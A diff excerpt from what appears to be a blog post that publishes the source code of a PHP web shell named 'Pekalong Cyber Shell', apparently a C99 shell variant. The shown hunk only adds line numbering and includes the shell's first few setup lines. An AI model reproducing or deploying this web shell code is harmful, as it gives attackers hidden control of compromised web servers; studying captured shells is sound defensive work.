@@ -17,7 +17,7 @@ I think this is actually a C99 shell, but the script says: Pekalongan Cyber | H1
 
 ### Pekalong Cyber Shell Source Code
 
-{% highlight php %}<?php //Starting calls
+{% highlight php linenos %}<?php //Starting calls
 if (!function_exists("getmicrotime")) {function getmicrotime() {list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}}
 error_reporting(5);
 @ignore_user_abort(TRUE);
